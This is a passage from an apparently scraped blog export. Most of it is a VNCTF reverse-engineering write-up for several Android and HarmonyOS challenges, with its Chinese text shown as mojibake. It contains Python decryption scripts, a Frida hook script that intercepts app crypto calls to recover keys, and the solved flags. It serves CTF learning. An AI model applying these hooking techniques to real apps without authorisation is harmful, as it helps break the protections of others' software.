b\u0026#39;d-\u0026gt;m_huff_code_sizes[0][s_tdefl_len_sym[match_len]]\\x00\u0026#39; addr: 0x2fc2c b\u0026#39;d-\u0026gt;m_huff_code_sizes[1][sym]\\x00\u0026#39; addr: 0x2fc50 b\u0026#39;d-\u0026gt;m_huff_code_sizes[0][lit]\\x00\u0026#39; addr: 0x2fc74 b\u0026#39;mz_bool mz_zip_array_ensure_capacity(mz_zip_archive *, mz_zip_array *, size_t, mz_uint)\\x00\u0026#39; addr: 0x2fcd0 b\u0026#39;pArray-\u0026gt;m_element_size\\x00\u0026#39; addr: 0x22fcec b\u0026#39;miniz.c version: %s\\n\\x00\u0026#39; addr: 0x22fd08 b\u0026#39;11.0.2\\x00\u0026#39; addr: 0x22fd14 b\u0026#39;Usage: example3 [options] [mode:c or d] infile outfile\\n\\x00\u0026#39; addr: 0x22fd50 b\u0026#39;\\nModes:\\n\\x00\u0026#39; addr: 0x22fd60 b\u0026#39;c - Compresses file infile to a zlib stream in file outfile\\n\\x00\u0026#39; addr: 0x22fda4 b\u0026#39;d - Decompress zlib stream in file infile to file outfile\\n\\x00\u0026#39; addr: 0x22fde4 b\u0026#39;\\nOptions:\\n\\x00\u0026#39; addr: 0x22fdf4 b\u0026#39;-l[0-10] - Compression level, higher values are slower.\\n\\x00\u0026#39; addr: 0x22fe34 b\u0026#39;Invalid level!\\n\\x00\u0026#39; addr: 0x22fe48 b\u0026#39;Invalid option: %s\\n\\x00\u0026#39; addr: 0x22fe60 b\u0026#39;Must specify mode, input filename, and output filename after options!\\n\\x00\u0026#39; addr: 0x22feac b\u0026#39;Too many filenames!\\n\\x00\u0026#39; addr: 0x22fec8 b\u0026#39;cCdD\\x00\u0026#39; addr: 0x22fed4 b\u0026#39;Invalid mode!\\n\\x00\u0026#39; addr: 0x22fee8 b\u0026#39;Mode: %c, Level: %u\\nInput File: \u0026#34;%s\u0026#34;\\nOutput File: \u0026#34;%s\u0026#34;\\n\\x00\u0026#39; addr: 0x22ff24 b\u0026#39;rb\\x00\u0026#39; addr: 0x22ff2c b\u0026#39;Failed opening input file!\\n\\x00\u0026#39; addr: 0x22ff4c b\u0026#39;File is too large to be processed by this example.\\n\\x00\u0026#39; addr: 0x22ff84 b\u0026#39;wb\\x00\u0026#39; addr: 0x22ff8c b\u0026#39;Failed opening output file!\\n\\x00\u0026#39; addr: 0x22ffb0 b\u0026#39;Input file size: %u\\n\\x00\u0026#39; addr: 0x22ffcc b\u0026#39;deflateInit() failed!\\n\\x00\u0026#39; addr: 0x22ffe8 b\u0026#39;Failed reading from input file!\\n\\x00\u0026#39; addr: 0x230010 b\u0026#39;Failed writing to output file!\\n\\x00\u0026#39; addr: 0x230034 b\u0026#39;deflate() failed with status %i!\\n\\x00\u0026#39; addr: 0x23005c b\u0026#39;deflateEnd() failed!\\n\\x00\u0026#39; addr: 0x230078 b\u0026#39;inflateInit() failed!\\n\\x00\u0026#39; addr: 0x230094 b\u0026#39;inflate() failed with status %i!\\n\\x00\u0026#39; addr: 0x2300bc b\u0026#39;inflateEnd() failed!\\n\\x00\u0026#39; addr: 0x2300d8 b\u0026#39;Total input bytes: %u\\n\\x00\u0026#39; addr: 0x2300f4 b\u0026#39;Total output bytes: %u\\n\\x00\u0026#39; addr: 0x230110 b\u0026#39;Success.\\n\\x00\u0026#39; ","date":"2025-02-19T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202502192347445.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/%E7%89%B9%E5%BE%81%E5%8C%B9%E9%85%8D%E6%89%B9%E9%87%8F%E5%A4%84%E7%90%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B7%B7%E6%B7%86/","title":"ç‰¹å¾åŒ¹é…æ‰¹é‡å¤„ç†å­—ç¬¦ä¸²æ··æ·†"},{"content":"VNCTF WP æŠ½å¥–è½¬ç›˜ ä¸€é“harmonyé€†å‘é¢˜ï¼Œç”¨abc-decompileråç¼–è¯‘abcæ–‡ä»¶ è™½ç„¶åç¼–è¯‘çš„ä»£ç å®åœ¨æ˜¯éå¸¸éš¾çœ‹ï¼Œç»è¿‡ä¸€ç•ªä»”ç»†çš„æœç´¢è¿˜æ˜¯èƒ½å®šä½åˆ°ä¸€äº›å…³é”®çš„é€»è¾‘ æœ€åä¸€ä¸ªå‡½æ•°ä¼šè°ƒç”¨libHello.soä¸­çš„MyCryæ–¹æ³•,å¹¶ä¼ å…¥ç”¨æˆ·çš„è¾“å…¥ï¼Œå‰é¢å‡ å¼ å›¾ç‰‡åˆ™æ˜¯å¯†æ–‡æ•°ç»„å’ŒéªŒè¯é€»è¾‘çš„ä¸€äº›å‡½æ•°ï¼Œæ¥ä¸‹æ¥è¦å»libHello.soå¯»æ‰¾å…¶ä»–çš„åŠ å¯†é€»è¾‘ æœç´¢\u0026quot;MyCry\u0026quot;å­—ç¬¦ä¸²å¯ä»¥å®šä½åˆ°MyCryå‡½æ•°çš„ä½ç½® å¦‚å›¾ï¼Œå…³é”®å‡½æ•°çš„ä½ç½®å·²åœˆå‡ºæ¥ï¼Œå…¶ä¸­æºæ‚ç€å¾ˆå¤šçš„å‡½æ•°ï¼ŒæŸ¥çœ‹ä¹‹åå‘ç°æ˜¯ä¸€äº›ç®€å•çš„è¿ç®—è¢«å°è£…æˆå‡½æ•°äº†è€Œå·² å…³é”®åœ¨äºsub_i111iIl1iå’Œsub_i111iIliiå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°çœ‹èµ·æ¥å¾ˆåƒä½†æ˜¯ä¸ä¸€æ · å…¶å®å°±æ˜¯é­”æ”¹çš„RC4ï¼Œè‡³äºæ‰§è¡Œå“ªä¸€ä¸ªï¼Œéƒ½è¯•ä¸€ä¸‹å°±è¡Œï¼Œå¤§æ¦‚åŠ å¯†æµç¨‹å°±è¿™æ ·ï¼Œç›´æ¥è´´exp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 import base64 global_key = b\u0026#39;\u0026#39; global_ciphertext = b\u0026#39;\u0026#39; # RC4è§£å¯†ç®—æ³• def rc4_decrypt(data: bytes, key: bytes) -\u0026gt; bytes: S = list(range(256)) j = 0 # KSAé˜¶æ®µ for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGAé˜¶æ®µ i = j = 0 plaintext = [] for byte in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] k = S[(S[i] + S[j]) % 256] plaintext.append(byte ^ k ^ 0x28) return bytes(plaintext) # Base64è§£ç  def base64_decode(data: bytes) -\u0026gt; bytes: return base64.b64decode(data) # å­—èŠ‚å‡3æ“ä½œ def bytes_minus_3(data: bytes) -\u0026gt; bytes: return bytes((b - 3) % 256 for b in data) # å¼‚æˆ–7åå‡1æ“ä½œ def bytes_xor7_minus1(data: bytes) -\u0026gt; bytes: return bytes(((b ^ 7) - 1) % 256 for b in data) if __name__ == \u0026#34;__main__\u0026#34;: global_key = b\u0026#39;Take_it_easy\u0026#39; global_ciphertext = bytes([101, 74, 76, 49, 101, 76, 117, 87, 55, 69, 118, 68, 118, 69, 55, 67, 61, 83, 62, 111, 81, 77, 115, 101, 53, 73, 83, 66, 68, 114, 109, 108, 75, 66, 97, 117, 93, 127, 115, 124, 109, 82, 93, 115]) step1 = bytes_xor7_minus1(global_ciphertext) step2 = base64_decode(step1) step3 = rc4_decrypt(step2, global_key) result = bytes_minus_3(step3) print(result.decode(\u0026#39;utf-8\u0026#39;)) #VNCTF{JUst_$ne_Iast_dance_2025!} kotlindroid è¿™æ˜¯ä¸€ä¸ªJetpack Composeæ¡†æ¶å¼€å‘çš„appï¼Œåœ¨Javaå±‚æœ‰å¤§é‡ä¸è§£é¢˜æ— å…³çš„å‡½æ•°ï¼Œä¸€å¼€å§‹ä¸çŸ¥é“ï¼Œå¯¼è‡´æˆ‘ä¹Ÿåœ¨è¿™æµªè´¹äº†å¾ˆå¤šæ—¶é—´ å®é™…çš„éªŒè¯é€»è¾‘åœ¨SearchActivityKtå’ŒSearchActivityKt$sec$1è¿™ä¸¤ä¸ªç±»ä¸‹é¢ï¼Œç›´æ¥çœ‹éªŒè¯é€»è¾‘ è¿™é‡Œç»‘å®šäº†buttonï¼Œç‚¹å‡»ä¼šè°ƒç”¨checkæ–¹æ³•å¹¶ä¼ å…¥ç”¨æˆ·è¾“å…¥å’Œä¸€ä¸ªæ‹¼æ¥å‡ºæ¥çš„key è¿™é‡Œå¯ä»¥çœ‹åˆ°checkæ–¹æ³•çš„é€»è¾‘ï¼Œå’Œä¸€äº›AESç›¸å…³çš„ä¿¡æ¯ï¼Œæ˜¯ä¸ªGCMæ¨¡å¼çš„åŠ å¯†ï¼Œivå‘é‡ç›´æ¥ç»™äº†114514 æ¥ç€æ‰¾åˆ°AESåŠ å¯†çš„å…·ä½“è¿‡ç¨‹ï¼Œå‘ç°æœ€ååœ¨base64ç¼–ç çš„æ—¶å€™ä¼šæŠŠivå‘é‡å’Œå¯†æ–‡ä¸€èµ·ç¼–ç ï¼Œè§£ç çš„æ—¶å€™è®°å¾—å»æ‰ AES-GCMæ¨¡å¼å¯ä»¥å‚è€ƒæ–‡ç« \nAES-GCMæ¨¡å¼è¯¦è§£\nè¿™é‡Œæˆ‘æ‰¾keyå’Œaadä¿¡æ¯ç›´æ¥ç”¨fridahookäº†ï¼Œæ‰¾åˆ°key:atrikeyssyekirta aad:mysecretadd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 Java.perform(function(){ var searchActivityKt = Java.use(\u0026#34;com.atri.ezcompose.SearchActivityKt\u0026#34;) searchActivityKt.check.implementation = function(str, context, key){ console.log(\u0026#34;check is called\u0026#34;); console.log(\u0026#34;str:\u0026#34;, JSON.stringify(str)); console.log(\u0026#34;context:\u0026#34;, JSON.stringify(context)); console.log(\u0026#34;key:\u0026#34;, JSON.stringify(key)); this.check(str, context, key); } var Cipher = Java.use(\u0026#39;javax.crypto.Cipher\u0026#39;); // Hooking the updateAAD method Cipher.updateAAD.overload(\u0026#39;[B\u0026#39;).implementation = function(bytes) { console.log(\u0026#39;updateAAD called with: \u0026#39; + bytes); // You can inspect the bytes here // Optionally call the original method return this.updateAAD(bytes); }; var ArraysKt___ArraysJvmKt = Java.use(\u0026#34;kotlin.collections.ArraysKt___ArraysJvmKt\u0026#34;) ArraysKt___ArraysJvmKt.plus.overload(\u0026#39;[B\u0026#39;, \u0026#39;[B\u0026#39;).implementation = function(plus, elements){ console.log(\u0026#34;plus is called\u0026#34;); console.log(\u0026#34;plus:\u0026#34;, JSON.stringify(plus)); console.log(\u0026#34;elements:\u0026#34;, JSON.stringify(elements)); return this.plus(plus, elements); } }); æœ€åè¿˜éœ€è¦tagï¼ŒæŸ¥é˜…èµ„æ–™äº†è§£åˆ°tagä¸€èˆ¬åµŒå…¥åœ¨å¯†æ–‡çš„å°¾éƒ¨ï¼Œé•¿åº¦ä¸º16å­—èŠ‚ï¼Œé‚£ä¹ˆç›´æ¥å†™expå³å¯\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad from Crypto.Random import get_random_bytes import base64 encoded_ciphertext = \u0026#34;HMuJKLOW1BqCAi2MxpHYjGjpPq82XXQ/jgx5WYrZ2MV53a9xjQVbRaVdRiXFrSn6EcQPzA==\u0026#34; ciphertext_with_tag = base64.b64decode(encoded_ciphertext) ciphertext = ciphertext_with_tag[:-16] tag = ciphertext_with_tag[-16:] key = b\u0026#39;atrikeyssyekirta\u0026#39; iv = b\u0026#39;114514\u0026#39; aad = b\u0026#39;mysecretadd\u0026#39; cipher = AES.new(key, AES.MODE_GCM, nonce=iv) cipher.update(aad) decrypted_data = cipher.decrypt_and_verify(ciphertext, tag) print(\u0026#34;Decrypted data:\u0026#34;, decrypted_data.decode()) #VNCTF{Y0U_@re_th3_Ma5t3r_0f_C0mp0s3} Hook Fish mainactivityä¸­å°±èƒ½çœ‹åˆ°å¤§éƒ¨åˆ†çš„éªŒè¯é€»è¾‘ï¼Œæœ€åçš„checkå’Œencodeæ–¹æ³•åœ¨ä¸‹è½½çš„hook_fish.dexä¸­,ä»ä»£ç ä¸­å¯ä»¥çœ‹å‡ºdexæ˜¯ä»urlä¸­ä¸‹è½½çš„ï¼Œé‚£ä¹ˆç›´æ¥å»resourceç›®å½•æ‰¾string.xml ç›´æ¥è®¿é—®è¿™ä¸ªç½‘å€å°±å¯ä»¥ä¸‹è½½dexæ–‡ä»¶åˆ†æ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 package fish; import java.util.HashMap; public class hook_fish { private HashMap fish_dcode; private HashMap fish_ecode; private String strr; public hook_fish() { this.strr = \u0026#34;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji\u0026#34;; this.encode_map(); this.decode_map(); } public boolean check(String s) { return s.equals(this.strr); } public String decode(String s) { StringBuilder stringBuilder0 = new StringBuilder(); int v1 = 0; for(int v = 0; v1 \u0026lt; s.length() / 5; v += 5) { stringBuilder0.append(this.fish_dcode.get(s.substring(v, v + 5))); ++v1; } return stringBuilder0.toString(); } public void decode_map() { HashMap hashMap0 = new HashMap(); this.fish_dcode = hashMap0; hashMap0.put(\u0026#34;iiijj\u0026#34;, Character.valueOf(\u0026#39;a\u0026#39;)); this.fish_dcode.put(\u0026#34;jjjii\u0026#34;, Character.valueOf(\u0026#39;b\u0026#39;)); this.fish_dcode.put(\u0026#34;jijij\u0026#34;, Character.valueOf(\u0026#39;c\u0026#39;)); this.fish_dcode.put(\u0026#34;jjijj\u0026#34;, Character.valueOf(\u0026#39;d\u0026#39;)); this.fish_dcode.put(\u0026#34;jjjjj\u0026#34;, Character.valueOf(\u0026#39;e\u0026#39;)); this.fish_dcode.put(\u0026#34;ijjjj\u0026#34;, Character.valueOf(\u0026#39;f\u0026#39;)); this.fish_dcode.put(\u0026#34;jjjji\u0026#34;, Character.valueOf(\u0026#39;g\u0026#39;)); this.fish_dcode.put(\u0026#34;iijii\u0026#34;, Character.valueOf(\u0026#39;h\u0026#39;)); this.fish_dcode.put(\u0026#34;ijiji\u0026#34;, Character.valueOf(\u0026#39;i\u0026#39;)); this.fish_dcode.put(\u0026#34;iiiji\u0026#34;, Character.valueOf(\u0026#39;j\u0026#39;)); this.fish_dcode.put(\u0026#34;jjjij\u0026#34;, Character.valueOf(\u0026#39;k\u0026#39;)); this.fish_dcode.put(\u0026#34;jijji\u0026#34;, Character.valueOf(\u0026#39;l\u0026#39;)); this.fish_dcode.put(\u0026#34;ijiij\u0026#34;, Character.valueOf(\u0026#39;m\u0026#39;)); this.fish_dcode.put(\u0026#34;iijji\u0026#34;, Character.valueOf(\u0026#39;n\u0026#39;)); this.fish_dcode.put(\u0026#34;ijjij\u0026#34;, Character.valueOf(\u0026#39;o\u0026#39;)); this.fish_dcode.put(\u0026#34;jiiji\u0026#34;, Character.valueOf(\u0026#39;p\u0026#39;)); this.fish_dcode.put(\u0026#34;ijijj\u0026#34;, Character.valueOf(\u0026#39;q\u0026#39;)); this.fish_dcode.put(\u0026#34;jijii\u0026#34;, Character.valueOf(\u0026#39;r\u0026#39;)); this.fish_dcode.put(\u0026#34;iiiii\u0026#34;, Character.valueOf(\u0026#39;s\u0026#39;)); this.fish_dcode.put(\u0026#34;jjiij\u0026#34;, Character.valueOf(\u0026#39;t\u0026#39;)); this.fish_dcode.put(\u0026#34;ijjji\u0026#34;, Character.valueOf(\u0026#39;u\u0026#39;)); this.fish_dcode.put(\u0026#34;jiiij\u0026#34;, Character.valueOf(\u0026#39;v\u0026#39;)); this.fish_dcode.put(\u0026#34;iiiij\u0026#34;, Character.valueOf(\u0026#39;w\u0026#39;)); this.fish_dcode.put(\u0026#34;iijij\u0026#34;, Character.valueOf(\u0026#39;x\u0026#39;)); this.fish_dcode.put(\u0026#34;jjiji\u0026#34;, Character.valueOf(\u0026#39;y\u0026#39;)); this.fish_dcode.put(\u0026#34;jijjj\u0026#34;, Character.valueOf(\u0026#39;z\u0026#39;)); this.fish_dcode.put(\u0026#34;iijjl\u0026#34;, Character.valueOf(\u0026#39;1\u0026#39;)); this.fish_dcode.put(\u0026#34;iiilj\u0026#34;, Character.valueOf(\u0026#39;2\u0026#39;)); this.fish_dcode.put(\u0026#34;iliii\u0026#34;, Character.valueOf(\u0026#39;3\u0026#39;)); this.fish_dcode.put(\u0026#34;jiili\u0026#34;, Character.valueOf(\u0026#39;4\u0026#39;)); this.fish_dcode.put(\u0026#34;jilji\u0026#34;, Character.valueOf(\u0026#39;5\u0026#39;)); this.fish_dcode.put(\u0026#34;iliji\u0026#34;, Character.valueOf(\u0026#39;6\u0026#39;)); this.fish_dcode.put(\u0026#34;jjjlj\u0026#34;, Character.valueOf(\u0026#39;7\u0026#39;)); this.fish_dcode.put(\u0026#34;ijljj\u0026#34;, Character.valueOf(\u0026#39;8\u0026#39;)); this.fish_dcode.put(\u0026#34;iljji\u0026#34;, Character.valueOf(\u0026#39;9\u0026#39;)); this.fish_dcode.put(\u0026#34;jjjli\u0026#34;, Character.valueOf(\u0026#39;0\u0026#39;)); } public String encode(String s) { StringBuilder stringBuilder0 = new StringBuilder(); for(int v = 0; v \u0026lt; s.length(); ++v) { stringBuilder0.append(((String)this.fish_ecode.get(Character.valueOf(s.charAt(v))))); } return stringBuilder0.toString(); } public void encode_map() { HashMap hashMap0 = new HashMap(); this.fish_ecode = hashMap0; hashMap0.put(Character.valueOf(\u0026#39;a\u0026#39;), \u0026#34;iiijj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;b\u0026#39;), \u0026#34;jjjii\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;c\u0026#39;), \u0026#34;jijij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;d\u0026#39;), \u0026#34;jjijj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;e\u0026#39;), \u0026#34;jjjjj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;f\u0026#39;), \u0026#34;ijjjj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;g\u0026#39;), \u0026#34;jjjji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;h\u0026#39;), \u0026#34;iijii\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;i\u0026#39;), \u0026#34;ijiji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;j\u0026#39;), \u0026#34;iiiji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;k\u0026#39;), \u0026#34;jjjij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;l\u0026#39;), \u0026#34;jijji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;m\u0026#39;), \u0026#34;ijiij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;n\u0026#39;), \u0026#34;iijji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;o\u0026#39;), \u0026#34;ijjij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;p\u0026#39;), \u0026#34;jiiji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;q\u0026#39;), \u0026#34;ijijj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;r\u0026#39;), \u0026#34;jijii\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;s\u0026#39;), \u0026#34;iiiii\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;t\u0026#39;), \u0026#34;jjiij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;u\u0026#39;), \u0026#34;ijjji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;v\u0026#39;), \u0026#34;jiiij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;w\u0026#39;), \u0026#34;iiiij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;x\u0026#39;), \u0026#34;iijij\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;y\u0026#39;), \u0026#34;jjiji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;z\u0026#39;), \u0026#34;jijjj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;1\u0026#39;), \u0026#34;iijjl\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;2\u0026#39;), \u0026#34;iiilj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;3\u0026#39;), \u0026#34;iliii\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;4\u0026#39;), \u0026#34;jiili\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;5\u0026#39;), \u0026#34;jilji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;6\u0026#39;), \u0026#34;iliji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;7\u0026#39;), \u0026#34;jjjlj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;8\u0026#39;), \u0026#34;ijljj\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;9\u0026#39;), \u0026#34;iljji\u0026#34;); this.fish_ecode.put(Character.valueOf(\u0026#39;0\u0026#39;), \u0026#34;jjjli\u0026#34;); } } encodeæ–¹æ³•å®é™…å°±æ˜¯ä¸€ä¸ªè‡ªå·±å†™çš„ç¼–ç ï¼Œç…§ç€ç è¡¨å°±å¯ä»¥decode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 decode_map = { \u0026#34;iiijj\u0026#34;: \u0026#39;a\u0026#39;, \u0026#34;jjjii\u0026#34;: \u0026#39;b\u0026#39;, \u0026#34;jijij\u0026#34;: \u0026#39;c\u0026#39;, \u0026#34;jjijj\u0026#34;: \u0026#39;d\u0026#39;, \u0026#34;jjjjj\u0026#34;: \u0026#39;e\u0026#39;, \u0026#34;ijjjj\u0026#34;: \u0026#39;f\u0026#39;, \u0026#34;jjjji\u0026#34;: \u0026#39;g\u0026#39;, \u0026#34;iijii\u0026#34;: \u0026#39;h\u0026#39;, \u0026#34;ijiji\u0026#34;: \u0026#39;i\u0026#39;, \u0026#34;iiiji\u0026#34;: \u0026#39;j\u0026#39;, \u0026#34;jjjij\u0026#34;: \u0026#39;k\u0026#39;, \u0026#34;jijji\u0026#34;: \u0026#39;l\u0026#39;, \u0026#34;ijiij\u0026#34;: \u0026#39;m\u0026#39;, \u0026#34;iijji\u0026#34;: \u0026#39;n\u0026#39;, \u0026#34;ijjij\u0026#34;: \u0026#39;o\u0026#39;, \u0026#34;jiiji\u0026#34;: \u0026#39;p\u0026#39;, \u0026#34;ijijj\u0026#34;: \u0026#39;q\u0026#39;, \u0026#34;jijii\u0026#34;: \u0026#39;r\u0026#39;, \u0026#34;iiiii\u0026#34;: \u0026#39;s\u0026#39;, \u0026#34;jjiij\u0026#34;: \u0026#39;t\u0026#39;, \u0026#34;ijjji\u0026#34;: \u0026#39;u\u0026#39;, \u0026#34;jiiij\u0026#34;: \u0026#39;v\u0026#39;, \u0026#34;iiiij\u0026#34;: \u0026#39;w\u0026#39;, \u0026#34;iijij\u0026#34;: \u0026#39;x\u0026#39;, \u0026#34;jjiji\u0026#34;: \u0026#39;y\u0026#39;, \u0026#34;jijjj\u0026#34;: \u0026#39;z\u0026#39;, \u0026#34;iijjl\u0026#34;: \u0026#39;1\u0026#39;, \u0026#34;iiilj\u0026#34;: \u0026#39;2\u0026#39;, \u0026#34;iliii\u0026#34;: \u0026#39;3\u0026#39;, \u0026#34;jiili\u0026#34;: \u0026#39;4\u0026#39;, \u0026#34;jilji\u0026#34;: \u0026#39;5\u0026#39;, \u0026#34;iliji\u0026#34;: \u0026#39;6\u0026#39;, \u0026#34;jjjlj\u0026#34;: \u0026#39;7\u0026#39;, \u0026#34;ijljj\u0026#34;: \u0026#39;8\u0026#39;, \u0026#34;iljji\u0026#34;: \u0026#39;9\u0026#39;, \u0026#34;jjjli\u0026#34;: \u0026#39;0\u0026#39; } def decode(encoded_str): decoded_str = \u0026#34;\u0026#34; for i in range(0, len(encoded_str), 5): block = encoded_str[i:i+5] if block in decode_map: decoded_str += decode_map[block] else: decoded_str += \u0026#39;?\u0026#39; return decoded_str encoded_string = \u0026#34;jjjliijijjjjjijiiiiijijiijjiijijjjiiiiijjjjliiijijjjjljjiilijijiiiiiljiijjiiliiiiiiiiiiiljiijijiliiiijjijijjijijijijiilijiijiiiiiijiljijiilijijiiiijjljjjljiliiijjjijiiiljijjijiiiiiiijjliiiljjijiiiliiiiiiljjiijiijiijijijjiijjiijjjijjjljiliiijijiiiijjliijiijiiliiliiiiiiljiijjiiliiijjjliiijjljjiijiiiijiijjiijijjjiiliiliiijiijijijiijijiiijjjiijjijiiiljiijiijilji\u0026#34; # æ›¿æ¢ä¸ºéœ€è¦è§£ç çš„å­—ç¬¦ä¸² decoded_string = decode(encoded_string) print(\u0026#34;Decoded string:\u0026#34;, decoded_string) #0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5 æœ‰äº†è¿™ä¸ªå¯†æ–‡ç›´æ¥é€†Javaå±‚çš„encryptæ–¹æ³•å°±å¥½äº†ï¼Œçº¯ç®—æ³•æ²¡ä»€ä¹ˆå¥½åˆ†æ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 def decrypt(encrypted_str): s = list(encrypted_str) for i in range(len(s)): s[i] = chr(decode_char(s[i], i)) reverse_code(s) hex_str = \u0026#39;\u0026#39;.join(s) bytes_data = bytes.fromhex(hex_str) decrypted = bytes([b - 68 for b in bytes_data]) return decrypted.decode() def decode_char(ch, i): if \u0026#39;a\u0026#39; \u0026lt;= decode_a2f(ch, i) \u0026lt;= \u0026#39;f\u0026#39;: return (ord(ch) - (i % 4)) + ord(\u0026#39;1\u0026#39;) else: return ord(ch) - ord(\u0026#39;7\u0026#39;) - (i % 10) def decode_a2f(ch, i): return chr((ord(ch) - (i % 4)) + ord(\u0026#39;1\u0026#39;)) def reverse_code(arr): for i in range(0, len(arr) - 1, 2): arr[i], arr[i + 1] = arr[i + 1], arr[i] encrypted_str = \u0026#34;0qksrtuw0x74r2n3s2x3ooi4ps54r173k2os12r32pmqnu73r1h432n301twnq43prruo2h5\u0026#34; decrypted_str = decrypt(encrypted_str) print(decrypted_str) #VNCTF{u_re4l1y_kn0w_H0Ok_my_f1Sh!1l} AndroidLux mainactivityä¸»è¦çš„æ–¹æ³•å°±æ˜¯connectAndSendLocalSocketServerï¼Œè¿™ä¸ªæ–¹æ³•ä¼šåˆ¤æ–­å½“å‰æœ‰æ²¡æœ‰åˆ›å»ºçº¿ç¨‹ï¼Œæœ‰çš„è¯å°±ç›´æ¥ä¸æœ¬åœ°çš„mahoshojoè¿›ç¨‹é€šä¿¡ï¼Œå°†ç”¨æˆ·çš„è¾“å…¥ä¼ ç»™è¿™ä¸ªè¿›ç¨‹å¤„ç† ç„¶åä¼šæ¥æ”¶ä»çº¿ç¨‹ä¼ å›æ¥çš„æ¶ˆæ¯ï¼Œå…³é”®é€»è¾‘è¿˜æ˜¯åœ¨busyboxæ‰§è¡Œçš„æ–‡ä»¶ä¸­ï¼Œæœ‰å…³busyboxçš„ä¿¡æ¯å¯ä»¥çœ‹ä¸‹é¢è¿™ç¯‡æ–‡ç« \nBusyBox - ç»´åŸºç™¾ç§‘ï¼Œè‡ªç”±çš„ç™¾ç§‘å…¨ä¹¦\nåœ¨assetç›®å½•ä¸‹æœ‰busyboxçš„å¯æ‰§è¡Œæ–‡ä»¶å’Œenvè¿™ä¸ªå‹ç¼©åŒ…ï¼Œåœ¨Javaä¸­å¯ä»¥çœ‹åˆ°appç¬¬ä¸€æ¬¡è¿è¡Œæ—¶ä¼šè§£å‹envå¹¶åˆå§‹åŒ–ç¯å¢ƒ åˆå§‹åŒ–ä¼šè°ƒç”¨åˆ°è¿™ä¸¤ä¸ªç±»ï¼Œå®ç°äº†ä¸€ä¸ªå‘½ä»¤è¡Œæ‰§è¡Œå™¨ï¼Œæ¥ä¸‹æ¥å°±å»è§£å‹çš„envé‡Œé¢æ‰¾æœ‰æ²¡æœ‰å¯ç–‘çš„æ–‡ä»¶ åœ¨root/ç›®å½•ä¸‹å‘ç°ä¸€ä¸ªenvå¯æ‰§è¡Œæ–‡ä»¶ï¼ŒBNæ‰“å¼€å‘ç°æ˜¯è¿›è¡Œäº†ä¸€ä¸ªè‡ªå®šä¹‰çš„é­”æ”¹Base64ç¼–ç 